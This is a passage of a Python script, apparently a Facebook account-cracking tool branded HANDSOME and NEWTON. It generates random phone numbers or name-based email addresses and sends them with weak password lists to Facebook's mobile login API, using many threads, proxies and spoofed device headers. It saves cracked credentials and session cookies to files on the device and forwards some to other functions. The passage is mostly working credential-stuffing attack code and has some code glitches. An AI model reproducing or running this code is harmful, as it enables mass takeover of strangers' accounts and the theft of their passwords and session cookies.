                                if mthd in ['1','01']:                                 
                                    HANDSOME.submit(rndm1,ids,passlist)
                                if mthd in ['2','02']:    
                                    HANDSOME.submit(rndm,ids,passlist)                                	
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python HANDSOME.py')       
def bd():
                user=[]
                clear()
                print('\033[1;37m Example : ,019,ETC')
                linex()
                print(" Put your country 3digit code")
                linex
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;37m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                clear()                        
                print(' [1] Method  \033[1;32m \n [2] \033[1;33mMethod  ') 
                linex()
                mthd = input('choose : ')
                clear()                       
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as HANDSOME:     
                        clear()
                        id = str(len(user))
                        print('Total account : \033[1;32m'+id)
                        print('The process is running in the background ')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
                                if mthd in ['1','01']:                                 
                                    HANDSOME.submit(rndm1,ids,passlist)
                                if mthd in ['2','02']:    
                                    HANDSOME.submit(rndm,ids,passlist)                                	
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python handsome.py') 
def gmail():
                os.system('rm -rf .re.txt')
                clear()
                print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
                linex()
                last = input(' Put last name: ')
                linex()
                print(' Example: @gmail.com , @yahoo.com etc...')
                linex()
                domain = input(' domain: ')
                linex()
                try:
                        limit=int(input(' Put limit: '))
                except ValueError:
                        limit = 5000
                linex()
                print(' Getting gmails...')
                lists = ['3','4']
                for xd in range(limit):
                        lchoice = random.choice(lists)
                        if '3' in lchoice:
                                mail = ''.join(random.choice(string.digits) for _ in range(3))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        else:
                                mail = ''.join(random.choice(string.digits) for _ in range(4))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        fo = open('.re.txt', 'r').read().splitlines()
                with tred(max_workers=30) as HANDSOME:
                        total = str(len(fo))
                        clear()
                        print(' Total account : \033[1;32m'+total)
                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
                                first_name = names.rsplit(' ')[0]
                                try:
                                        last_name = names.rsplit(' ')[1]
                                except IndexError:
                                        last_name = 'Khan'
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                                ALONE.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python handsome.py')
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [NEWTON-M1] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                uaaa = make()
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                nip=random.choice(proxsi)
                                proxs= {'http': 'socks4://'+nip}
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"ex_MX","client_country_code":"MX",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'Host': 'graph.facebook.com',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'X-FB-Connection-Type': 'MOBILE.LTE',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':make(),
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-device-group': '5120',
                                        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                                        'x-fb-friendly-name':'ViewerReactionsMutation',
                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                                po = requests.post(url,data=data,headers=head,proxies=proxs,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m [NEWTON-OK] '+ids+' | '+pas+'\033[1;97m')
                                        color = random.choice([GREEN,RED,WHITE,YELLOW,BLUE,ORANGE,PURPLE,AQUA,MAGENTA,BLACK])
                                        print(f"\033[1;32m [COOOKIS] :{color}{cookie}")
                                        open('/sdcard/NEWTON_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NEWTON_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        smart(ids,pas)
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[2F-LAXA] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                                elif 'www.facebook.com' in q['error']['message']:
                                        smart(ids,pas)
                                        break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def M2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [NEWTON-M2] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])          
                                ua = iAmMethod2Ua()
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                nip=random.choice(proxsi)
                                proxs= {'http': 'socks4://'+nip}
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"ex_MX","client_country_code":"MX",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'Host': 'graph.facebook.com',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'X-FB-Connection-Type': 'MOBILE.LTE',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-device-group': '5120',
                                        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                                        'x-fb-friendly-name':'ViewerReactionsMutation',
                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://m.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                                po = requests.post(url,data=data,headers=head,proxies=proxs,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m NEWTON-OK] '+ids+' | '+pas+'\033[1;97m')
                                        print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
                                        open('/sdcard/NEWTON_M2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NEWTON_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        Elite(ids,pas,cookie)
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;91m [NEWTON-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/NEWTON-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/NEWTON-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def M3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [NEWTON-M3] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])          
                                ua = iAmMethod2Ua()
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                nip=random.choice(proxsi)
                                proxs= {'http': 'socks4://'+nip}
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"ex_MX","client_country_code":"MX",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'Host': 'graph.facebook.com',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'X-FB-Connection-Type': 'MOBILE.LTE',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-device-group': '5120',
                                        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                                        'x-fb-friendly-name':'ViewerReactionsMutation',
                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                                po = requests.post(url,data=data,headers=head,proxies=proxs,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"  
                                        print(f"\r\r\033[1;32mFBLINK:https://www.facebook.com/"+ids)                              	
                                        print('\r\r\033[1;32m [NEWTON-OK] '+ids+' | '+pas+'\033[1;97m')
                                        print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
                                        open('/sdcard/NEWTON_M3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NEWTON_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        Elite(ids,pas,cookie)
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[2F-ID] '+ids+' | '+pas)
                                                open('/sdcard/NEWTON-2F.txt', 'a').write(ids+'|'+pas+'\n')
                                                twf.append(ids)
                                                break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;91m [NEWTON-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/NEWTON-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/NEWTON-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass

def rndm1(ids,passlist):
        global loop
        global oks,cps
        sys.stdout.write('\r\r\033[1;32m [NEWTON-M1] %s|OK-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
                        fbbv = str(random.randint(111111111,999999999))
                        androidon = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                        fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                        density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                        width = random.randint(720, 1440)
                        height = random.randint(1080, 2560)
                        fblc = random.choice(["ja_JP","en_AF","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                        fbcr = random.choice(["Telenor","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                        fban = random.choice(["FB4A", "FB5A", "FB6A"])
                        fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
                        ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/{fbpn};FBDV/Xiaomi 14 Ultra;FBSV/14;nullFBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'device_based_login',
                                "sim_country": "id",
                                "network_country": "id",
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [ALONE-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}" 
                                        open('/sdcard/🍪.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')                                     
                                        open('/sdcard/OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        Elite(uid,pas,cookie)
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;208m [FILE_BANA_YESLE] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/FILE_BANA_YESLE.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass                          
def rndm(ids,passlist):
        global loop
        global oks,cps
        sys.stdout.write('\r\r\033[1;37m [HANDSOME-M2] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'                        
                        facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
                        fbbv = str(random.randint(111111111,999999999))
                        androidon = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                        fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                        density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                        width = random.randint(720, 1440)
                        height = random.randint(1080, 2560)
                        fblc = random.choice(["ja_JP","en_AF","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                        fbcr = random.choice(["Telenor","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                        fban = random.choice(["FB4A", "FB5A", "FB6A"])
                        fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
                        ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/en_US;FBCR/Etisalat;FBMF/Tecno;FBBD/Tecno;FBDV/TECNO BG7;FBSV/13;FBCA/armeabi-v8a:armeabi;FBDM/"+"{density=2.0,width=720,height=1440};FB_FW/1;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'device_based_login',
                                "sim_country": "id",
                                "network_country": "id",
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }

                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [HANDSOME-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"  
                                        open('/sdcard/🍪.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')                                     
                                        open('/sdcard/OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        Elite(uid,pas,cookie)
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[1;91mm [FILE_BANA_YESLE] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/FILE_BANA_YESLE.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass                   
                        
try:
	menu()
except requests.exceptions.ConnectionError:
